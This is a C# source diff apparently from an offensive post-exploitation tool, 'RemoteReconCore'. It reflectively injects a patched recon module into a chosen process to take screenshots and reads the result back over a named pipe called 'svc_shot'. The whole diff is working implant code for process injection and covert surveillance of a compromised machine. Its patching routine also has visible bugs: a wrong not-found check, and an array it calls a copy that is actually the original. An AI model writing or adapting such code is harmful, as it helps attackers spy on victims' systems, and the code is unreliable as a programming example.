@@ -3,15 +3,9 @@ using System.Text;
 using System.Reflection;
 using Microsoft.Win32;
 using System.Security.Principal;
-using System.Security;
-using System.Runtime.InteropServices;
 using System.IO;
+using System.IO.Pipes;
 using System.Threading;
-using System.Runtime.Remoting;
-using System.Runtime.Remoting.Channels.Ipc;
-using System.Runtime.Remoting.Channels;
-using System.Diagnostics;
-using RemoteReconKS;
 using ReflectiveInjector;
 using System.Collections.Generic;
 
@@ -152,27 +146,42 @@ namespace RemoteReconCore
             string image = "";
             //Function for connecting to the remoting server and obtaining the screenshot
             //Inject the recon module into the target process.
-            Injector screenshot = new Injector(pid, mod);
+            byte[] patchedMod = PatchRemoteReconNative("screenshot");
+            Injector screenshot = new Injector(pid, patchedMod);
+#if DEBUG
+            Console.WriteLine("Created screenshot object");
+#endif
             if (!screenshot.Inject())
                 result = new KeyValuePair<int, object>(2, "Recon module injection failed.");
             else
             {
-                //Connect to the remote module via IPC
-                ChannelServices.RegisterChannel(new IpcChannel(), false);
-                WellKnownClientTypeEntry rrScreenShot = new WellKnownClientTypeEntry(typeof(RemoteRecon), "ipc://rr_ks/");
-                RemotingConfiguration.RegisterWellKnownClientType(rrScreenShot);
-
-                //Take a screenshot
-                RemoteRecon runner = new RemoteRecon();
-                if ((image = runner.screenshot()) == "")
-                    result = new KeyValuePair<int, object>(2, "screenshot failed");
-                else
+                //TODO: Write named pipe client to grab output from the remote module
+#if DEBUG
+                Console.WriteLine("Attempting to connect to named pipe");
+#endif
+                try
+                {
+                    NamedPipeClientStream client = new NamedPipeClientStream(".", "svc_shot", PipeDirection.InOut);
+                    client.Connect((1000 * sleep));
+                    StreamReader reader = new StreamReader(client);
+                    image = reader.ReadToEnd();
+                    client.Close();
+                    client.Dispose();
+#if DEBUG
+                    Console.WriteLine("Writing result");
+#endif
                     result = new KeyValuePair<int, object>(0, image);
-
-                runner.exit();
+                }
+                catch (Exception e)
+                {
+#if DEBUG
+                    Console.WriteLine("Connect to namedpipe failed");
+#endif
+                    result = new KeyValuePair<int, object>(2, e.ToString());
+                }
             }
         }
-
+        
         private byte[] GetReconModule()
         {
             string resourceName = "";
@@ -190,6 +199,28 @@ namespace RemoteReconCore
             }
 
             return Convert.FromBase64String(bytestring);
+        }
+
+        private byte[] PatchRemoteReconNative(string cmd)
+        {
+            byte[] cmdBytes = Encoding.ASCII.GetBytes(cmd);
+            byte[] modCopy = mod;
+            int index = 0;
+            string moduleString = Encoding.ASCII.GetString(mod);
+            index = moduleString.IndexOf("Replace-Me  ");
+
+            if(index == 0)
+                return new byte[1] { 0 };
+
+            for (int i = 0; i < cmdBytes.Length; i++)
+            {
+                modCopy[index + i] = cmdBytes[i];
+            }
+
+            modCopy[index + cmdBytes.Length] = 0x00;
+            modCopy[index + cmdBytes.Length + 1] = 0x00;
+
+            return modCopy;
         }
     }
 }
